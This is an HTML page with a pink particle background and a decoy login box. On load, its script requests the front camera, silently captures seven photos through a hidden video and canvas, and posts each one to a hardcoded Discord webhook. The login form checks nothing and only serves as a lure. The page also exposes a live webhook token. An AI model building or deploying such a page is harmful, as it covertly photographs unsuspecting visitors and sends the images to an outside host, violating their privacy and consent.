<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Captura de Foto com Permiss√£o</title>
  <style>
    body {
      background: url('https://i.pinimg.com/originals/c5/c2/74/c5c274a4c4b3c36d764b7e74bf7a1de9.gif') center/cover no-repeat fixed;
      color: white;
      text-align: center;
      font-family: sans-serif;
      height: 100vh;
      overflow: hidden;
      margin: 0;
      position: relative;
    }
    #login-screen {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: rgba(0,0,0,0.7);
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 20px rgba(255,105,180,0.8);
    }
    #content {
      display: none;
      position: absolute;
      width: 100%;
      height: 100%;
    }
    input, button {
      margin: 10px;
      padding: 8px;
      border-radius: 5px;
      border: none;
    }
    button {
      background: #ff69b4;
      color: white;
      cursor: pointer;
      transition: 0.3s;
    }
    button:hover {
      background: #ff1493;
    }
    #particles-js {
      position: absolute;
      width: 100%;
      height: 100%;
      z-index: -1;
    }
  </style>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/particles.js/2.0.0/particles.min.css">
</head>
<body>
  <div id="particles-js"></div>
  
  <div id="login-screen">
    <h2>Login</h2>
    <input type="text" id="username" placeholder="Username">
    <br>
    <input type="password" id="password" placeholder="Password">
    <br>
    <button onclick="login()">Entrar</button>
  </div>

  <div id="content">
    <video id="video" width="320" height="240" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
  </div>

  <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
  <script>
    // Login function
    function login() {
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;
      
      if (username && password) { // Basic validation
        document.getElementById('login-screen').style.display = 'none';
        document.getElementById('content').style.display = 'block';
      } else {
        alert('Por favor, insira usu√°rio e senha!');
      }
    }

    // Particles configuration
    particlesJS("particles-js", {
      particles: {
        number: { value: 80, density: { enable: true, value_area: 800 } },
        color: { value: "#ff69b4" },
        shape: { type: "circle" },
        opacity: { value: 0.5, random: true },
        size: { value: 3, random: true },
        line_linked: { enable: true, distance: 150, color: "#ff69b4", opacity: 0.4, width: 1 },
        move: { enable: true, speed: 6, direction: "none", random: true, straight: false, out_mode: "out" }
      },
      interactivity: {
        detect_on: "canvas",
        events: {
          onhover: { enable: true, mode: "repulse" },
          onclick: { enable: true, mode: "push" }
        }
      }
    });

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');

    // Pede acesso √† c√¢mera frontal
    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
      .then(stream => {
        video.srcObject = stream;
        tirarFoto(); // Come√ßa a tirar as fotos automaticamente
      })
      .catch(err => {
        alert('Erro ao acessar a c√¢mera: ' + err);
      });

    async function tirarFoto() {
      for (let i = 1; i <= 7; i++) {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));

        const form = new FormData();
        form.append("file", blob, `foto${i}.png`);
        form.append("content", `üì∏ Foto ${i} capturada`);

        fetch("https://discord.com/api/webhooks/1378435477954367692/L8ASivkftMYzFrUE-wD6a-IqgOoWLRXUN-wG1mbnKwXZMtIeVrf6Qa_nHr4E_a1H9Ogn", {
          method: "POST",
          body: form
        }).then(() => {
          console.log(`Foto ${i} enviada com sucesso!`);
        }).catch(err => {
          console.error(`Erro ao enviar foto ${i}:`, err);
        });

        await new Promise(r => setTimeout(r, 1000));
      }
    }
  </script>

</body>
</html>
